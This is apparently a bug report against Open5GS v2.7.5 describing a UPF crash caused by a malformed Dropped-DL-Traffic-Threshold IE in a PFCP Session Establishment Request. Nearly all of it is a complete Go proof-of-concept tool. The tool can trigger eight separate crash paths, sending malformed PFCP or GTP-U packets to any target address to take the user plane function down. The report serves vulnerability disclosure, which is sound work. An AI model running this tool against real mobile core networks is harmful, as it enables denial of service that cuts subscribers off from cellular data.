### Open5GS Release, Revision, or Tag

v2.7.5



### Description

When UPF receives a PFCP Session Establishment Request containing a CreateURR with a malformed Dropped-DL-Traffic-Threshold IE, the UPF crashes.



### Steps to reproduce
1. Start a new go project inside a new folder: go mod init poc
2. Create a main.go and paste the code below:

```
package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

const (
	defaultPFCPPort = 8805
	readTimeout     = 2 * time.Second
)

type pfcpClient struct {
	nodeIP net.IP
	seid   uint64
	seq    uint32
}

func (c *pfcpClient) nextSeq() uint32 {
	c.seq++
	if c.seq == 0 || c.seq > 0x00ffffff {
		c.seq = 1
	}
	return c.seq
}

func (c *pfcpClient) mandatoryIEs() []*ie.IE {
	return []*ie.IE{
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewFSEID(c.seid, c.nodeIP, nil),
		ie.NewPDNType(ie.PDNTypeIPv4),
	}
}

func (c *pfcpClient) buildSession(ies ...*ie.IE) *message.SessionEstablishmentRequest {
	payload := append([]*ie.IE{}, c.mandatoryIEs()...)
	payload = append(payload, ies...)
	return message.NewSessionEstablishmentRequest(0, 0, c.seid, c.nextSeq(), 0, payload...)
}

func (c *pfcpClient) sendAssociation(conn *net.UDPConn) error {
	req := message.NewAssociationSetupRequest(
		c.nextSeq(),
		ie.NewNodeID(c.nodeIP.String(), "", ""),
		ie.NewRecoveryTimeStamp(time.Now()),
		ie.NewCPFunctionFeatures(0x3f),
	)

	return sendAndMaybeRead(conn, req)
}

type pfcpMarshaler interface {
	Marshal() ([]byte, error)
}

func sendAndMaybeRead(conn *net.UDPConn, msg pfcpMarshaler) error {
	payload, err := msg.Marshal()
	if err != nil {
		return fmt.Errorf("marshal PFCP message: %w", err)
	}
	if _, err := conn.Write(payload); err != nil {
		return fmt.Errorf("send PFCP message: %w", err)
	}

	_ = conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 2048)
	if _, err := conn.Read(buf); err != nil {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			return nil
		}
		return fmt.Errorf("read PFCP response: %w", err)
	}
	return nil
}

func newDefaultFar(id uint32) *ie.IE {
	return ie.NewCreateFAR(
		ie.NewFARID(id),
		ie.NewApplyAction(0x02), // FORW
		ie.NewForwardingParameters(
			ie.NewDestinationInterface(ie.DstInterfaceAccess),
		),
	)
}

func newValidFTEID(teid uint32, ip net.IP) *ie.IE {
	return ie.NewFTEID(0x01, teid, ip, nil, 0)
}

func buildFteidCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(1)
	badFteid := ie.New(ie.FTEID, []byte{0x01})
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(1),
		ie.NewPrecedence(32),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			badFteid,
		),
		ie.NewFARID(1),
	)
	return client.buildSession(pdr, far), nil
}

func buildOuterHeaderCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	badOuter := ie.New(ie.OuterHeaderCreation, []byte{})
	far := ie.NewCreateFAR(
		ie.NewFARID(2),
		ie.NewApplyAction(0x02),
		ie.NewForwardingParameters(
			ie.NewDestinationInterface(ie.DstInterfaceAccess),
			badOuter,
		),
	)
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(2),
		ie.NewPrecedence(64),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF01, client.nodeIP),
		),
		ie.NewFARID(2),
	)
	return client.buildSession(pdr, far), nil
}

func buildQERBitrateCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(3)
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(3),
		ie.NewPrecedence(96),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF02, client.nodeIP),
		),
		ie.NewFARID(3),
		ie.NewQERID(9),
	)

	badMBR := ie.New(ie.MBR, []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07})
	qer := ie.NewCreateQER(
		ie.NewQERID(9),
		ie.NewGateStatus(ie.GateStatusOpen, ie.GateStatusOpen),
		badMBR,
	)

	return client.buildSession(pdr, far, qer), nil
}

func buildDroppedDLCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(4)
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(4),
		ie.NewPrecedence(128),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF03, client.nodeIP),
		),
		ie.NewFARID(4),
		ie.NewURRID(11),
	)

	badDropped := ie.New(ie.DroppedDLTrafficThreshold, []byte{0x03, 0x00, 0x01, 0x02})
	urr := ie.NewCreateURR(
		ie.NewURRID(11),
		ie.NewMeasurementMethod(1, 0, 0),
		ie.NewReportingTriggers(0x01, 0x00),
		badDropped,
	)

	return client.buildSession(pdr, far, urr), nil
}

func buildSDFFilterCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(5)
	invalidFlow := "drop in ip from any to any"
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(5),
		ie.NewPrecedence(160),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF04, client.nodeIP),
			ie.NewSDFFilter(invalidFlow, "", "", "", 0),
		),
		ie.NewFARID(5),
	)

	return client.buildSession(pdr, far), nil
}

func buildSDFFilterNullCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(6)
	malformedFlow := "permit"
	pdr := ie.NewCreatePDR(
		ie.NewPDRID(6),
		ie.NewPrecedence(192),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF05, client.nodeIP),
			ie.NewSDFFilter(malformedFlow, "", "", "", 0),
		),
		ie.NewFARID(6),
	)

	return client.buildSession(pdr, far), nil
}

func buildSDFFilterOversizeCrash(client *pfcpClient, dnn string) (*message.SessionEstablishmentRequest, error) {
	far := newDefaultFar(7)
	flow := "permit out ip from any to any"
	sdf := ie.NewSDFFilter(flow, "", "", "", 0)
	if len(sdf.Payload) >= 4 {
		binary.BigEndian.PutUint16(sdf.Payload[2:4], 0xFFFF)
	}

	pdr := ie.NewCreatePDR(
		ie.NewPDRID(7),
		ie.NewPrecedence(224),
		ie.NewPDI(
			ie.NewSourceInterface(ie.SrcInterfaceAccess),
			ie.NewNetworkInstance(dnn),
			newValidFTEID(0xABCDEF06, client.nodeIP),
			sdf,
		),
		ie.NewFARID(7),
	)

	return client.buildSession(pdr, far), nil
}

type attackBuilder func(*pfcpClient, string) (*message.SessionEstablishmentRequest, error)

func resolveTarget(target string) (string, error) {
	if strings.Contains(target, ":") {
		return target, nil
	}
	return fmt.Sprintf("%s:%d", target, defaultPFCPPort), nil
}

func main() {
	var (
		target     = flag.String("target", "127.0.0.1:8805", "UPF PFCP endpoint (host[:port])")
		nodeIPStr  = flag.String("node-ip", "10.0.0.1", "Local NodeID (IPv4)")
		dnn        = flag.String("dnn", "internet", "Network Instance / DNN")
		mode       = flag.String("mode", "fteid", "Which crash path to trigger: fteid|outer-header|qer-bitrate|dl-threshold|sdf-filter|sdf-null|sdf-oversize|gtpu-error")
		skipAssoc  = flag.Bool("skip-assoc", false, "Skip PFCP Association Setup")
		dumpHex    = flag.Bool("dump", false, "Dump crafted Session Establishment bytes")
		seidFlag   = flag.Uint64("seid", 0, "Override CP F-SEID (defaults to random)")
		gtpuTarget = flag.String("gtpu-target", "127.0.0.1:2152", "UPF GTP-U endpoint (host[:port]) for gtpu-error mode")
		teidFlag   = flag.Uint64("teid", 0, "TEID to use in gtpu-error mode")
	)
	flag.Parse()

	nodeIP := net.ParseIP(*nodeIPStr)
	if nodeIP == nil {
		log.Fatalf("invalid node-ip: %s", *nodeIPStr)
	}

	resolvedTarget, err := resolveTarget(*target)
	if err != nil {
		log.Fatalf("resolve target: %v", err)
	}

	remoteAddr, err := net.ResolveUDPAddr("udp", resolvedTarget)
	if err != nil {
		log.Fatalf("resolve UDP addr: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		log.Fatalf("dial PFCP: %v", err)
	}
	defer conn.Close()

	seid := *seidFlag
	if seid == 0 {
		rand.Seed(time.Now().UnixNano())
		seid = uint64(rand.Uint32())<<32 | uint64(rand.Uint32())
	}

	if *mode == "gtpu-error" {
		if *teidFlag == 0 {
			log.Fatalf("gtpu-error mode requires -teid to be set to a valid TEID")
		}
		if err := sendGtpuErrorCrash(*gtpuTarget, uint32(*teidFlag)); err != nil {
			log.Fatalf("send gtpu-error packet: %v", err)
		}
		log.Printf("sent malformed GTP-U Error Indication to %s (TEID=0x%x)", *gtpuTarget, uint32(*teidFlag))
		return
	}

	client := &pfcpClient{nodeIP: nodeIP, seid: seid, seq: uint32(rand.Intn(0xffffff))}

	attacks := map[string]attackBuilder{
		"fteid":        buildFteidCrash,
		"outer-header": buildOuterHeaderCrash,
		"qer-bitrate":  buildQERBitrateCrash,
		"dl-threshold": buildDroppedDLCrash,
		"sdf-filter":   buildSDFFilterCrash,
		"sdf-null":     buildSDFFilterNullCrash,
		"sdf-oversize": buildSDFFilterOversizeCrash,
	}

	builder, ok := attacks[*mode]
	if !ok {
		keys := make([]string, 0, len(attacks))
		for k := range attacks {
			keys = append(keys, k)
		}
		log.Fatalf("unknown mode %q (valid: %s)", *mode, strings.Join(keys, ","))
	}

	if !*skipAssoc {
		if err := client.sendAssociation(conn); err != nil {
			log.Printf("association setup failed: %v", err)
		} else {
			log.Printf("association setup request sent to %s", resolvedTarget)
		}
	}

	req, err := builder(client, *dnn)
	if err != nil {
		log.Fatalf("build %s request: %v", *mode, err)
	}

	payload, err := req.Marshal()
	if err != nil {
		log.Fatalf("marshal %s request: %v", *mode, err)
	}

	if *dumpHex {
		fmt.Printf("Session Establishment (%d bytes):\n%s\n", len(payload), hex.Dump(payload))
	}

	if _, err := conn.Write(payload); err != nil {
		log.Fatalf("send %s request: %v", *mode, err)
	}
	log.Printf("sent %s Session Establishment to %s (F-SEID=0x%x)", *mode, resolvedTarget, client.seid)

	_ = conn.SetReadDeadline(time.Now().Add(readTimeout))
	buf := make([]byte, 2048)
	if n, err := conn.Read(buf); err == nil {
		fmt.Printf("received %d-byte response\n", n)
	} else if !errors.Is(err, os.ErrDeadlineExceeded) {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			log.Printf("no response within %s (expected on crash)", readTimeout)
		} else {
			log.Printf("read response: %v", err)
		}
	}
}

func sendGtpuErrorCrash(target string, teid uint32) error {
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return fmt.Errorf("resolve GTP-U target: %w", err)
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return fmt.Errorf("dial GTP-U target: %w", err)
	}
	defer conn.Close()

	// Minimal GTP-U header
	header := make([]byte, 8)
	header[0] = 0x30 // Version 1, PT=1, no extension/seq
	header[1] = 26   // Error Indication

	payload := make([]byte, 5)
	payload[0] = 16 // Type 16 (TEID Data I)
	binary.BigEndian.PutUint32(payload[1:5], teid)

	binary.BigEndian.PutUint16(header[2:4], uint16(len(payload)))
	binary.BigEndian.PutUint32(header[4:8], teid)

	packet := append(header, payload...)

	if _, err := conn.Write(packet); err != nil {
		return fmt.Errorf("write GTP-U packet: %w", err)
	}

	return nil
}
```
